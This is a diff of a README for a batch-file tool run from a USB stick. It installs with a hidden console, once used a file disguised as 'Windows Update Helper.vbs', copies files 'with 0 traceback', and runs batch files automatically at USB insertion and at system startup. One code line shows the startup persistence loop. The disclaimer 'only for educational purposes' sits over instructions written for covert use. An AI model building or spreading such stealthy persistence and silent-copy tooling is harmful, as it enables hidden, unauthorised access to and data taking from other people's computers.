@@ -2,11 +2,12 @@
 
 Batch program created to enable quick copying with "0" traceback   
 
-HIGLY ENCOURAGED TO USE NEWER VERSIONS, OLDER MAY HAVE SEVERE BUGS
+HIGLY ENCOURAGED TO USE NEWER VERSIONS, OLDER MAY HAVE SEVERE BUGS  
+USE NEWER DEBUG THIS ONE HAS SEVERE BUGS; WILL UPDATE SOON
 
 # How to install and use
 
-to install, you need "Windows Update Helper.vbs", lmao.bat and lmao69.dat on the *root* of the usb and launch lmao.bat (since 4.0-debug only lmao.bat)  
+to install, you need lmao.bat; others will be generated automatically (if you have >= 4.0)
 Installation takes around 3 seconds, however most of this time, the cmd is invisible  
 
 after install you only need lmao69.dat with "initcopy" inside (without quotes)  
@@ -22,7 +23,7 @@ UNIN000.dat -> uninstalls the "tool" (OPTIONAL)
 atinsert.dat -> adds programs to be executed at usb insertion (only .bat); works only if name in lmao69.dat (OPTIONAL) 
 
 atstartup.dat -> adds programs to be executed at startup (only .bat); works only if name in lmao69.dat (OPTIONAL)  
-code for handling these (since 3.5 filtering to only launch .bat):
+code for handling these:
 `if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (for /r "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" %%a in (*.bat) do (call "%%a"))`  
 
 transfer.dat -> copy files to hdd upon usb insert; D:\transfer\Desktop\idk.docx => C:\Windows\Users\USERNAME\Desktop\idk.docx (OPTIONAL)  
@@ -40,15 +41,14 @@ I have also added 2 additional .bat files that help with certain stuff. First on
 
 # NOTE
 
-atinsert and atstartup date change CRASHES THE APP if the folders are empty! (since 3.7_updated bug removed)  
+in order to change filename and not reinstall(i.e. dont have the time), use rename.bat(in optional) with atstartup(CHANGE LINE IN FILE); for the first time, you still the old one  
+recommended to do this and then pull out the usb and put it back in
 
-in order to change filename and not reinstall(i.e. dont have the time), use rename.bat(in optional) with atstartup(CHANGE LINE IN FILE)  
+if using app inside lmao69.dat, make sure to have `exit` at the end of the file for the cmd to not stay visible; also in longer programs add `@echo off` for commands to be invisible. (you dont need to do any of this if you are using 4.2-debug and later)
 
-if using app inside lmao69.dat, make sure to have `exit` at the end of the file for the cmd to not stay visible; also in longer programs add `@echo off` for commands to be invisible. (you dont need to do any this if you are using 4.2-debug and later)
-
-CURRENTLY, UPDATES FROM HDD NOT WORKING (fixed since 4.3(not present -> 4.5-DEBUGrelease))
+CURRENTLY, UPDATES FROM HDD NOT WORKING (fixed since 4.5-DEBUGrelease)
 
 ## Current version: 4.1 (4.0_nobugs)
-### Current Debug Version: 4.5 (HUGE fixes, see additional info for release)
+### Current Debug Version: 4.6 (fixed some minor bugs IN ADDITION to 4.5(read add. info dfor both))
 I am not responsible for any problems that may arise while using this tool. 
 Only for educational purposes
